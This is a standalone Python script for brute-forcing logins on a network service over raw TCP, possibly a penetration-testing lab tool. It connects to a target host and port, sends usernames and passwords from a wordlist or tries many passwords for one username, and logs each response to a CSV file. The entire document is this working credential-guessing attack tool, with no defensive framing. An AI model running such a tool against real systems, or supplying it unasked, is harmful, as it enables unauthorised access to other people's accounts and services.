import argparse
import socket
import sys
import time


def connect(host, port, verbose=None):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    print(f"Connecting to {host} on port {port}")
    s.connect((host, port))

    banner = s.recv(2048)
    if verbose:
        print(banner.decode())
    return s


def login(socket, user, password, verbose=None):
    if verbose:
        print("*******")

    print(f"Attempting login {user}:{password}")

    socket.send((user + '\n').encode())
    time.sleep(.2)
    result = socket.recv(2048)

    if verbose:
        print(result.decode())

    socket.send((password + '\n').encode())
    time.sleep(.2)
    result = socket.recv(2048).decode()

    if verbose:
        print(result)

    return result



def read_input_file(path, _type, delimiter=None):
    with open(path, "r") as f:
        lines = f.read().splitlines()

    if _type == "up":
        return [x.split(delimiter) for x in lines]
    else:
        return lines


def main(host, port, input_file, _type, delimiter, username=None, verbose=None):
    input_list = read_input_file(input_file, _type, delimiter)
    s = connect(host, port, verbose)

    o = open("brute_force_output.csv", "w")
    o.write("user,password,result\n")

    if _type == "u":
        for password in input_list:
            result = login(s, username, password, verbose)
            result = result.replace("\n", "\t")
            o.write(f"{username},{password},{result}\n")
    else:
        for item in input_list:
            if len(item) > 1:
                result = login(s, item[0], item[1], verbose)
                result = result.replace("\n", "\t")
                o.write(f"{item[0]},{item[1]},{result}\n")

    o.close()
    s.close()
    print("Output saved to brute_force_output.csv")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("host", help="Target IP address or hostname")
    parser.add_argument("port", help="Target port", type=int)
    parser.add_argument("-l", "--list", help="Path to username and/or password list")
    parser.add_argument("-t", "--type",
                        help="Specify if you are using a list of usernames (u) or usernames and password (up)",
                        default="up")
    parser.add_argument("-d", "--delimiter", help="Delimiter in username and password list.", default=":")
    parser.add_argument("-u", "--username", help="Used if a password list is given")
    parser.add_argument("-v", action="store_true", help="Add verbosity.")
    args = parser.parse_args()

    if args.type not in ['u', 'up']:
        sys.exit("-t must be either 'u' or 'up'")

    if args.username and (args.type == "up"):
        sys.exit("-u should not be used while -t is 'up'")

    if args.username is None and args.type == "u":
        sys.exit("-u is required when -t=u")

    main(
        host=args.host,
        port=args.port,
        input_file=args.list,
        _type=args.type,
        delimiter=args.delimiter,
        username=args.username,
        verbose=args.v
    )

